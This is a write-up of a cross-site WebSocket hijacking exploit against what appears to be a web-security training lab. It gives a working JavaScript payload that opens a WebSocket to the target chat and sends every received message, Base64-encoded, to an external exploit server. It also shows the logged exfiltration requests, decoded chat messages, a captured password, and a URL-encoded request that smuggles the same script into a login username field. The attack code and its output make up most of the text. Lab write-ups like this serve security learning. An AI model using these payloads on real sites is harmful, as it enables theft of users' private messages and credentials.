# WebSocket Exploitation Writeup

## Overview
This document details the exploitation process of a WebSocket vulnerability to exfiltrate sensitive messages. The payloads used, along with the resulting data, are documented here for further analysis and learning purposes.

---

## Exploitation Process

### Payload Details
**JavaScript Payload for WebSocket Exploitation:**
```javascript
var webSocket = new WebSocket("wss://0af40095033d514e80d971ea00c80092.web-security-academy.net/chat");

webSocket.onopen = function (evt) {
    webSocket.send("READY");
};

webSocket.onmessage = function (evt) { 
    var message = evt.data; 
    fetch("https://exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net/exploit?message=" + btoa(message));
};
```

This payload initiates a WebSocket connection, sends a `READY` message upon opening the connection, and exfiltrates messages received via the WebSocket to an external server after encoding them with Base64.

---

### Observed Requests and Responses
Here are the HTTP requests sent during exploitation:

**Request:**
```
GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1
Host: exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

**Decoded Message:**
```json
{
  "user": "You",
  "content": "I forgot my password"
}
```

Additional examples:

**Request:**
```
GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1
```

**Decoded Message:**
```json
{
  "user": "CONNECTED",
  "content": "-- Now chatting with Hal Pine --"
}
```

---

### Final Password
The final extracted password:
```
12809bxgicu8j9in9wge
```

---

### Additional Payloads
**Encoded Request Example:**
```
GET /login?username=%65%79%4a%31%63%32%56%79%49%6a%6f%69%51%30%39%4f%54%6b%56%44%56%45%56%45%49%69%77%69%59%32%39%75%64%47%56%75%64%43%49%36%49%69%30%74%49%45%35%76%64%79%42%6a%61%47%46%30%64%47%6c%75%5a%79%42%33%61%58%52%6f%49%45%68%68%62%43%42%51%62%47%6c%75%5a%53%41%74%4c%53%4a%39%3c%73%63%72%69%70%74%3e%0a%0a%76%61%72%20%77%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%66%34%30%30%39%35%30%33%33%64%35%31%34%65%38%30%64%39%37%31%65%61%30%30%63%38%30%30%39%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%77%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%77%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%0a%77%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%20%0a%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%20%0a%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%61%34%30%30%66%38%30%33%31%35%35%31%65%30%38%30%66%36%37%30%33%61%30%31%61%32%30%30%62%33%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
